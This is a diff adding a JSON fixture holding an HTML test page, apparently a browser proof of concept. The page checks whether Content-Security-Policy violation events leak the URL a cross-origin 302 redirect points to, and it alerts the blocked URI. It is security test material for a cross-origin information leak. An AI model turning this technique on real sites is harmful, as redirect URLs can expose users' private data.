@@ -1,0 +1,11 @@
+```json
+{
+  "f1542194": {
+    "leak.test": {
+      "main": {
+        "index.html": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline' vulnerabledoma.in\">\n    <script>\n        document.addEventListener('securitypolicyviolation', e => {\n            console.dir(e);\n            alert(e.blockedURI);\n        });\n    </script>\n</head>\n<body>\n    <button id=\"test1\">TEST 1</button>\n    <button id=\"test2\">TEST 2</button>\n    <button id=\"test3\">TEST 3</button>\n\n    <script>\n        document.getElementById('test1').onclick = function() {\n            window.open('https://vulnerabledoma.in/fx_csp_violation_leak_302.php');\n        };\n        document.getElementById('test2').onclick = function() {\n            window.location.href = 'https://www.vulnerabledoma.in/path?query';\n        };\n        document.getElementById('test3').onclick = function() {\n            const link = document.createElement('a');\n            link.href = 'https://www.vulnerabledoma.in/path?query';\n            link.click();\n        };\n    </script>\n</body>\n</html>\n"
+      }
+    }
+  }
+}
+```
